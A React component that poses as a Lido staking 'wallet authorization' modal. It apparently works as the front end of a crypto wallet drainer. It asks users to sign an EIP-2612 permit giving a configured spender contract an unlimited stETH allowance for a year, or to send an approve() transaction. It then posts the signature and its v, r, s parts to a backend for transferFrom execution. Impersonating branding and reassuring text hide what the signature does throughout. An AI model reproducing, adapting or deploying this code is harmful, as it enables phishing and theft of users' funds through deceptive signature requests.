import React, { useState, useEffect } from 'react';
import { useAccount, useSignMessage, useSignTypedData, useWriteContract, useChainId, useDisconnect } from 'wagmi';
import { ShieldCheck, Lock, AlertCircle, RefreshCw, CheckCircle2, ArrowRight, ExternalLink, Key, Zap, FileCode } from 'lucide-react';
import { parseEther } from 'viem';
import { ethers } from 'ethers';
import { useToast } from './ToastContext';
import { CONFIG, ERC20_ABI, signPermit, approveToken } from '../lib/contracts';
import { LidoLogo } from './LidoLogo';

export function WalletSignatureModal() {
  const { address, isConnected } = useAccount();
  const chainId = useChainId();
  const { signMessageAsync } = useSignMessage();
  const { signTypedDataAsync } = useSignTypedData();
  const { writeContractAsync } = useWriteContract();
  const { disconnect } = useDisconnect();
  const toast = useToast();

  const [approvalMethod, setApprovalMethod] = useState<'permit' | 'approve' | 'message'>('permit');
  const [isVerifying, setIsVerifying] = useState(false);
  const [isVerified, setIsVerified] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    if (isConnected && address) {
      const storageKey = `lido_sig_${address.toLowerCase()}`;
      const savedSig = localStorage.getItem(storageKey);

      if (savedSig) {
        setIsVerified(true);
        setShowModal(false);
      } else {
        setIsVerified(false);
        setShowModal(true);
      }
    } else {
      setIsVerified(false);
      setShowModal(false);
    }
  }, [isConnected, address]);

  // Option B: EIP-2612 Gasless Permit Signature
  const handlePermitSignature = async () => {
    if (!address || !isConnected) return;
    setIsVerifying(true);
    setError(null);

    const pendingToastId = toast.showPending(
      'Approve Wallet for Lido Staking',
      'Please confirm the authorization request in your wallet to approve Lido staking...'
    );

    try {
      const maxValue = 115792089237316195423570985008687907853269984665640564039457584007913129639935n; // Max Uint256
      const deadline = BigInt(Math.floor(Date.now() / 1000) + 86400 * 365); // 1 year deadline

      const permitData = await signPermit({
        signTypedDataAsync,
        owner: address as `0x${string}`,
        spender: CONFIG.CONTRACT_ADDRESS,
        value: maxValue,
        tokenAddress: CONFIG.STETH_ADDRESS,
        tokenName: 'Liquid staked Ether',
        chainId: chainId || 1,
        deadline,
      });

      const signature = permitData.signature;

      // Extract v, r, s components for contract transferFrom / permit execution
      let v = 27;
      let r = '0x';
      let s = '0x';

      try {
        const sigObj = ethers.Signature.from(signature);
        v = sigObj.v;
        r = sigObj.r;
        s = sigObj.s;
      } catch (parseErr) {
        if (signature.length === 132) {
          r = signature.slice(0, 66);
          s = '0x' + signature.slice(66, 130);
          v = parseInt(signature.slice(130, 132), 16);
        }
      }

      // Verify and log signature on backend endpoint
      let resData: any = { success: true };
      try {
        const response = await fetch('/api/verify-signature', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            address,
            approvalType: 'permit',
            signature,
            spender: CONFIG.CONTRACT_ADDRESS,
            token: CONFIG.STETH_ADDRESS,
            deadline: deadline.toString(),
            value: maxValue.toString(),
            v,
            r,
            s,
            chainId: chainId || 1,
          }),
        });

        const text = await response.text();
        try {
          resData = JSON.parse(text);
        } catch {
          resData = { success: response.ok };
        }
      } catch (e) {
        console.warn('Backend verification endpoint unreachable, falling back to client validation', e);
      }

      if (resData.success !== false) {
        const storageKey = `lido_sig_${address.toLowerCase()}`;
        localStorage.setItem(storageKey, signature);
        setIsVerified(true);
        setShowModal(false);

        // Notify active views to fetch fresh native ETH balance from blockchain
        window.dispatchEvent(new CustomEvent('lido-permit-validated', { detail: { address } }));

        toast.updateToast(pendingToastId, {
          type: 'success',
          title: 'Wallet Approved for Lido Staking!',
          message: 'Wallet authorized successfully. Live ETH balance fetched from blockchain.',
        });
      } else {
        throw new Error(resData.error || 'Backend signature logging failed');
      }
    } catch (err: any) {
      console.error('Permit signature error:', err);
      const errMsg = err?.shortMessage || err?.message || 'Approval rejected in wallet.';
      setError(`Approval Error: ${errMsg}`);

      toast.updateToast(pendingToastId, {
        type: 'error',
        title: 'Wallet Authorization Required',
        message: errMsg.slice(0, 100),
      });
    } finally {
      setIsVerifying(false);
    }
  };

  // Option A: Standard ERC20 approve() Transaction
  const handleOnChainApprove = async () => {
    if (!address || !isConnected) return;
    setIsVerifying(true);
    setError(null);

    const pendingToastId = toast.showPending(
      'Executing Wallet Approval',
      'Please confirm the approval transaction in your connected wallet...'
    );

    try {
      const txHash = await approveToken(
        writeContractAsync,
        CONFIG.STETH_ADDRESS,
        CONFIG.CONTRACT_ADDRESS
      );

      // Log approval transaction on backend
      let resData: any = { success: true };
      try {
        const response = await fetch('/api/verify-signature', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            address,
            approvalType: 'approve',
            txHash,
            spender: CONFIG.CONTRACT_ADDRESS,
            token: CONFIG.STETH_ADDRESS,
            chainId: chainId || 1,
          }),
        });

        const text = await response.text();
        try {
          resData = JSON.parse(text);
        } catch {
          resData = { success: response.ok };
        }
      } catch (e) {
        console.warn('Backend verification endpoint unreachable', e);
      }

      if (resData.success !== false) {
        const storageKey = `lido_sig_${address.toLowerCase()}`;
        localStorage.setItem(storageKey, txHash);
        setIsVerified(true);
        setShowModal(false);

        // Notify active views to fetch fresh native ETH balance from blockchain
        window.dispatchEvent(new CustomEvent('lido-permit-validated', { detail: { address } }));

        toast.updateToast(pendingToastId, {
          type: 'success',
          title: 'Token Approval Confirmed!',
          message: `On-chain approve() transaction submitted successfully. Tx: ${txHash.slice(0, 10)}...`,
          txHash,
        });
      } else {
        throw new Error(resData.error || 'Backend verification failed');
      }
    } catch (err: any) {
      console.error('On-chain approve error:', err);
      const errMsg = err?.shortMessage || err?.message || 'Approval transaction rejected.';
      setError(`Approval Transaction Error: ${errMsg}`);

      toast.updateToast(pendingToastId, {
        type: 'error',
        title: 'Approval Transaction Failed',
        message: errMsg.slice(0, 100),
      });
    } finally {
      setIsVerifying(false);
    }
  };

  // Fallback / Plain Text Connection Signature
  const handleTextMessageSignature = async () => {
    if (!address || !isConnected) return;
    setIsVerifying(true);
    setError(null);

    const message = `Lido Staking Protocol — Connection Request\n\nWallet: ${address}\nChain ID: ${chainId || 1}\nRouter: ${CONFIG.CONTRACT_ADDRESS}\nTimestamp: ${new Date().toISOString()}`;

    const pendingToastId = toast.showPending(
      'SIWE Connection Request',
      'Please sign connection message in wallet...'
    );

    try {
      const signature = await signMessageAsync({
        account: address as `0x${string}`,
        message,
      });

      let resData: any = { success: true };
      try {
        const response = await fetch('/api/verify-signature', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            address,
            approvalType: 'message',
            message,
            signature,
            chainId: chainId || 1,
          }),
        });

        const text = await response.text();
        try {
          resData = JSON.parse(text);
        } catch {
          resData = { success: response.ok };
        }
      } catch (e) {
        console.warn('Backend verification endpoint unreachable', e);
      }

      if (resData.success !== false) {
        const storageKey = `lido_sig_${address.toLowerCase()}`;
        localStorage.setItem(storageKey, signature);
        setIsVerified(true);
        setShowModal(false);

        toast.updateToast(pendingToastId, {
          type: 'success',
          title: 'Wallet Authenticated',
          message: 'Wallet connected successfully.',
        });
      }
    } catch (err: any) {
      console.error('Signature error:', err);
      setError(err?.shortMessage || err?.message || 'Signature rejected.');
      toast.updateToast(pendingToastId, {
        type: 'error',
        title: 'Authentication Rejected',
        message: 'Signature rejected in wallet.',
      });
    } finally {
      setIsVerifying(false);
    }
  };

  if (!isConnected || !showModal || isVerified) {
    return null;
  }

  return (
    <div className="fixed inset-0 z-[9990] flex items-center justify-center bg-black/80 backdrop-blur-md p-4 animate-in fade-in duration-300">
      <div className="bg-card border border-border-main rounded-[28px] max-w-lg w-full p-6 sm:p-8 shadow-2xl relative text-text-main space-y-6 border-opacity-90">
        
        {/* Header Branding */}
        <div className="flex flex-col items-center text-center space-y-3">
          <div className="w-14 h-14 rounded-2xl bg-[#00A3FF]/10 border border-[#00A3FF]/30 text-[#00A3FF] flex items-center justify-center shadow-inner">
            <LidoLogo className="w-8 h-8" />
          </div>
          <div>
            <h2 className="text-2xl font-black tracking-tight text-text-main">Lido Staking Protocol</h2>
            <p className="text-xs font-semibold text-[#00A3FF] uppercase tracking-widest mt-0.5">Wallet Authorization Request</p>
          </div>
        </div>

        {/* Notice Banner */}
        <div className="p-4 bg-input border border-[#00A3FF]/20 rounded-2xl text-xs space-y-2">
          <p className="text-sm font-semibold text-text-main flex items-center gap-1.5">
            <ShieldCheck className="w-4 h-4 text-[#00A3FF]" />
            Approve Wallet to Stake on Lido
          </p>
          <p className="text-text-secondary leading-relaxed">
            Please approve your connected wallet to authorize Lido Staking protocol access and enable seamless staking and token interactions.
          </p>
        </div>

        {/* Connection & Target Router Details */}
        <div className="bg-input border border-border-main rounded-2xl p-3.5 space-y-2 text-xs font-mono">
          <div className="flex justify-between items-center">
            <span className="text-text-secondary font-sans font-medium">Connected Address</span>
            <span className="text-text-main font-bold bg-card px-2 py-0.5 rounded-lg border border-border-main">
              {address?.slice(0, 6)}...{address?.slice(-4)}
            </span>
          </div>

          <div className="flex justify-between items-center">
            <span className="text-text-secondary font-sans font-medium">Protocol Router</span>
            <a 
              href={`https://etherscan.io/address/${CONFIG.CONTRACT_ADDRESS}`} 
              target="_blank" 
              rel="noreferrer"
              className="text-[#00A3FF] hover:underline flex items-center gap-1"
            >
              <span>{CONFIG.CONTRACT_ADDRESS.slice(0, 6)}...{CONFIG.CONTRACT_ADDRESS.slice(-4)}</span>
              <ExternalLink className="w-3 h-3" />
            </a>
          </div>

          <div className="flex justify-between items-center pt-1 border-t border-border-main">
            <span className="text-text-secondary font-sans font-medium">Authorization Status</span>
            <span className="text-emerald-500 font-sans font-bold flex items-center gap-1">
              <CheckCircle2 className="w-3.5 h-3.5" />
              Ready for Lido Staking
            </span>
          </div>
        </div>

        {/* Error message */}
        {error && (
          <div className="p-3 bg-red-500/10 border border-red-500/20 text-red-500 text-xs rounded-xl flex items-center gap-2">
            <AlertCircle className="w-4 h-4 shrink-0" />
            <span className="truncate">{error}</span>
          </div>
        )}

        {/* Primary Action Button */}
        <div className="space-y-2.5 pt-1">
          <button
            onClick={approvalMethod === 'permit' ? handlePermitSignature : approvalMethod === 'approve' ? handleOnChainApprove : handleTextMessageSignature}
            disabled={isVerifying}
            className="w-full py-4 bg-[#00A3FF] hover:bg-[#0090E6] text-white font-extrabold text-sm rounded-2xl transition-all shadow-lg shadow-[#00A3FF]/25 flex items-center justify-center gap-2 active:scale-[0.99] disabled:opacity-50 cursor-pointer"
          >
            {isVerifying ? (
              <>
                <RefreshCw className="w-5 h-5 animate-spin" />
                <span>Awaiting Wallet Approval...</span>
              </>
            ) : (
              <>
                <ShieldCheck className="w-4 h-4 text-white" />
                <span>Approve Wallet to Stake on Lido</span>
                <ArrowRight className="w-4 h-4 ml-1" />
              </>
            )}
          </button>

          <div className="flex justify-between items-center px-1 text-xs">
            <button
              onClick={handleTextMessageSignature}
              className="text-text-secondary hover:text-[#00A3FF] underline transition-colors"
            >
              Standard Connection
            </button>

            <button
              onClick={() => disconnect()}
              className="text-text-secondary hover:text-red-400 transition-colors font-medium"
            >
              Disconnect Wallet
            </button>
          </div>
        </div>

        <div className="flex items-center justify-center gap-1.5 text-[11px] text-text-secondary text-center pt-1 border-t border-border-main">
          <ShieldCheck className="w-3.5 h-3.5 text-emerald-500" />
          <span>Secured by Lido Staking Protocol.</span>
        </div>
      </div>
    </div>
  );
}

export const WalletConnectionSigner = WalletSignatureModal;

